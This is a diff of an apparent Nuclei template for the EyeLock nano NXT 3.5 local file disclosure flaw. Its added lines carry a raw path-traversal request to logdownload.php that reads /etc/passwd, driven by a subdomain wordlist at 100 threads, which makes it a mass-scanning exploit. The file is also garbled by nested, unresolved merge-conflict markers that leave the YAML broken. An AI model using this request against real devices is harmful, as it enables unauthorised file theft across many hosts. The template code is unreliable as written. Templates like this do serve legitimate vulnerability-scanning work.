@@ -3,10 +3,9 @@ id: eyelock-nano-lfd
 info:
 <<<<<<< HEAD
   name: EyeLock nano NXT 3.5 - Local File Disclosure
-  description:
   author: geeknik
-  reference: https://www.zeroscience.mk/codes/eyelock_lfd.txt
   severity: high
+<<<<<<< HEAD
   tags: eyelock,lfd,traversal,iot,biometrics
 =======
   name: EyeLock nano NXT 3.5 - Arbitrary File Retrieval
@@ -18,12 +17,25 @@ info:
     - https://www.zeroscience.mk/codes/eyelock_lfd.txt
   tags: iot,lfi,eyelock
 >>>>>>> 5d36d276 (add new stuff)
+=======
+  description: nano NXT suffers from a file disclosure vulnerability when input passed through the 'path' parameter to 'logdownload.php' script is not properly verified before being used to read files. This can be exploited to disclose contents of files from local resources.
+  reference: https://www.zeroscience.mk/codes/eyelock_lfd.txt
+  tags: iot,lfi,eyelock
+>>>>>>> 18ddf72b (add new stuff)
 
 requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}/scripts/logdownload.php?dlfilename=juicyinfo.txt&path=../../../../../../../../etc/passwd"
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
 
+    raw:
+      - |
+        GET /scripts/logdownload.php?dlfilename=juicyinfo.txt&path=../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
     matchers-condition: and
     matchers:
       - type: status
